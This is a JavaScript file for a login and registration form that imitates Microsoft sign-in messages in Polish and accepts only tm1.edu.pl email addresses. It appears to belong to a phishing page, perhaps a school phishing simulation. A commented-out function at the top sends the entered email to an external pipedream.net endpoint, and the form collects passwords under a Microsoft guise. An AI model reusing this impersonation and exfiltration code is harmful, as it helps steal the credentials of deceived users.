// async function logging(){
//     const t = document.getElementById("username").value;
//     await fetch(`https://eo2isf33hwr4zgo.m.pipedream.net/?email=${t}`);
//     window.location.reload();
// }


function forgotPassMessage(){
    r = document.getElementById("result");
    r.innerHTML = "Wprowadź poświadczenia przekazane przez opiekuna (adres email z domeny tm1.edu.pl)";
}


btnNext = document.querySelector("#loginbtn");

function validateEmail(e) {
    return /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/.test(e) 
    && e.indexOf("@tm1.edu.pl", e.length - "@tm1.edu.pl".length) !== -1;
}
function validate() {
    const r = document.getElementById("result"),
        u = document.getElementById("username").value;
    
    return (
        r.innerHTML = "",
        !!validateEmail(u) ||
            (u 
                ? (r.innerHTML = "To konto Microsoft nie istnieje.\n Zarejestruj się przy użyciu innego konta lub załóż nowe.", r.style.color = "black")
                : (r.innerHTML = "Wprowadź poprawny adres email.", r.style.color = "black", !1)
            )
    );
}


btnNext.addEventListener("click", function () {
    const e = document.getElementById("username").value;
    const r = document.getElementById("result");
    const p1 = document.getElementById("password").value;
    const p2 = document.getElementById("password2").value
    if (!validate()) return;
    if (!validateEmail(e)) return;
    if (p1=="" || p2=="")
        r.innerHTML = "Wprowadź hasło.";
    else if (p1!=p2)
        r.innerHTML = "Wprowadzone hasła się nie zgadzają.";
    else if (r.innerHTML == "") 
        location.href = 'register.html';

    
    // window.location.reload();
});

